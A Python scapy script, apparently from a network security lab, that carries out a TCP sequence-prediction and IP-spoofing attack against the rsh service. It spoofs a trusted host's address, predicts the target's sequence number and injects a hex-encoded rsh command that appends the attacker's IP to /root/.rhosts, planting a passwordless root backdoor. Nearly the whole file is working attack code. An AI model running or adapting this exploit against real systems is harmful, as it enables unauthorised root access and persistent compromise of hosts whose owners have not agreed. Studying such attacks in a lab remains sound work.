from scapy.all import *

import sys
import time
import random

if __name__ == "__main__":
    random.seed(time.time())

    conf.iface = sys.argv[1]
    target_ip = sys.argv[2]
    trusted_host_ip = sys.argv[3]
    my_ip = get_if_addr(sys.argv[1])

    randPort1 = random.randrange(700, 1000)
    randPort2 = 1023

    #TODO: figure out SYN sequence number pattern
    ackTimestamp = 0
    targetSeqNum = 0
    seqMul = 0
    # Sending request ads ourself
    packet = IP(src=my_ip, dst=target_ip) / TCP(sport=randPort1, dport=514, flags="S")
    resp = sr1(packet, verbose=0, timeout=2)
    resp.show()
    if resp and (TCP in resp) and (resp[TCP].flags.S and resp[TCP].flags.A):
        ackTimestamp = time.time()
        targetSeqNum = resp[TCP].seq
        time.sleep(1)
        rstPacket = IP(src=my_ip, dst=target_ip) / TCP(ack=targetSeqNum+1, sport=randPort1, dport=514, flags="RA")
        send(rstPacket, verbose=0)
    
    seqMul = targetSeqNum//64000
    #TODO: TCP hijacking with predicted sequence number
    packet = IP(src=trusted_host_ip, dst=target_ip) / TCP(sport=randPort2, dport=514, flags="S")
    send(packet, verbose=0)
    elapsedTime = (time.time() - ackTimestamp)*1.0 + .61
    multipleDelta = int(2*elapsedTime) - 1
    print("#mulipleDelta:", multipleDelta)
    predictedSeqNum = int(((seqMul+multipleDelta)*64000) + 1)
    print('#Elapsed Time:', elapsedTime)
    print('#Observed Previous Seq num:', targetSeqNum)
    print('#Predicted Seq num:', predictedSeqNum)
    # sleep for a second
    time.sleep(1)
    # Send back our predicted ack
    packet = IP(src=trusted_host_ip, dst=target_ip) / TCP(ack=predictedSeqNum+1, seq=1, sport=randPort2, dport=514, flags="A")
    send(packet, verbose=0) # ACK SENT
    # STDERR PORT Signal RSH
    stderrLoad = b"\x31\x30\x32\x32\x00"
    # One ack sent to the trusted host -- Ignore
    # SYN sent from target to trusted about 0.04 seconds later
    # Send a SYN,ACK with 64000 added to predicted Seq as SYN,ACK from port 1022 to 1023

    # Send RSH Payload
    RSHPayload = b"\x72\x6f\x6f\x74\x00\x72\x6f\x6f\x74\x00\x65\x63\x68\x6f\x20\x27" + str.encode(my_ip) + b"\x20\x72\x6f\x6f\x74\x27\x20\x3e\x3e\x20\x2f\x72\x6f\x6f\x74\x2f\x2e\x72\x68\x6f\x73\x74\x73\x00"
    packet = IP(src=trusted_host_ip, dst=target_ip) / TCP(ack=predictedSeqNum+1, seq=1, sport=randPort2, dport=514, flags="PA") / Raw(load=RSHPayload)
    send(packet, verbose=0)
    time.sleep(0.5)
    # RST both the connection
    newPack = IP(src=trusted_host_ip, dst=target_ip) / TCP(ack=predictedSeqNum+1, sport=randPort2, dport=514, flags="R")
    send(newPack,verbose=0)



# Val  =  b"\x73\x74\x75\x64\x65\x6e\x74\x00\x73\x74\x75\x64\x65\x6e\x74\x00\x65\x63\x68\x6f\x20\x27"
   
#    41

#    str.encode(my_ip)
   
# b"\x20\x72\x6f\x6f\x74\x27\x20\x3e\x3e\x20\x2f\x72\x6f\x6f\x74\x2f\x2e\x72\x68\x6f\x73\x74\x73\x00"
